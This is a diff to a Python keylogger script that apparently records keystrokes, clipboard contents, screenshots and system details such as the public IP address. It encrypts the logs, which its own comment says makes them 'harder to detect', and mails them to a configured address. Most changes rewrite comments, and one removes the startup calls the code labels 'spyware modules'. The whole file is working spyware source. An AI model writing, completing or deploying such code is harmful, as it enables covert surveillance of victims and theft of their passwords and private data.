@@ -13,36 +13,36 @@ from cryptography.fernet import Fernet
 from requests import get
 from PIL import ImageGrab
 
-# Declaring important variables for data storage
+# declaring important variables for data storage
 keys_info = "key_log.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 screenshot_info = "screenshot.png"
 
-# Variables for encryptyed data storage
+# variables for encryptyed data storage
 keys_info_e = "e_key_log.txt"
 system_info_e = "e_system_info.txt"
 clipboard_info_e = "e_clipboard.txt"
 
-# Amount of seconds for the iteration timer to wait before moving to the next iteration
+# amount of seconds for the iteration timer to wait before moving to the next iteration
 time_iteration = 1800
 num_iterations_end = 4
 
-# Email account the information will be sent to
+# email account the information will be sent to
 emailAddress = ""
 password = ""
 toAddress = ""
 
-# The encryption key
+# the encryption key
 crypt_key = str("")
 
-# File path the data variables will be stored into
+# file path the data variables will be stored into
 file_path = ""
 extend = "\\"
 file_merge = file_path + extend
 
 
-# Using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
+# using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
 def send_email(filename, attachment, toAddress):
     fromAddress = emailAddress
     msg = MIMEMultipart()
@@ -66,18 +66,18 @@ def send_email(filename, attachment, toAddress):
     s.quit()
 
 
-# Extracts a lot of information about the computer and saves it to the file path
+# extracts a lot of information about the computer and saves it to the file path
 def computer_info():
     with open(file_path + extend + system_info, "a") as f:
         hostname = socket.gethostname()
         ipAddress = socket.gethostbyname(hostname)
 
         try:
-            publicIP = get("https://api.ipify.org").text
+            publicIP = get("https://api.ipify.org").text            # uses get to pull the public IP address of the host
             f.write("Public IP Address: " + publicIP + '\n')
 
         except Exception:
-            f.write("Couldn't locate Public IP Address, likely reached max query" + '\n')
+            f.write("Couldn't locate Public IP Address, likely reached max query" + '\n')   # in case ipify gets mad
 
         f.write("Processor: " + (platform.processor() + '\n'))
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
@@ -86,7 +86,7 @@ def computer_info():
         f.write("Private IP Address: " + ipAddress + '\n')
 
 
-# Copy the clipboard and save it to the file path
+# copy the clipboard and save it to the file path with exception if something doesn't work
 def copy_clipboard():
     with open(file_path + extend + clipboard_info, "a") as f:
         try:
@@ -100,18 +100,14 @@ def copy_clipboard():
             f.write("Could not copy clipboard")
 
 
-# Taking a screenshot
+# taking a screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_info)
 
 
-# Calling all of the spyware modules
-copy_clipboard()
-
+# calling computer_info in order to email it later
 computer_info()
-
-screenshot()
 
 
 # iteration loop that includes a screenshot and a clipboard copy at the end of each iteration.
@@ -120,6 +116,8 @@ currentTime = time.time()  # tracks the time
 stoppingTime = time.time() + time_iteration  # tracks the stopping time
 
 while num_iterations < num_iterations_end:  # while statement for the iterations
+    
+    # creating a count variables and an array for storing and tracking key presses
     count = 0
     keys = []
 
@@ -166,10 +164,11 @@ while num_iterations < num_iterations_end:  # while statement for the iterations
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
-# Encrypts the text files the keylogger saves from the given key, making it harder to detect
+# encrypts the text files the keylogger saves from the given key, making it harder to detect
 files_encrypt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
 encrypted_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]
 
+# counter to track which file is next to encrypt
 count = 0
 
 for encrypting_file in files_encrypt:
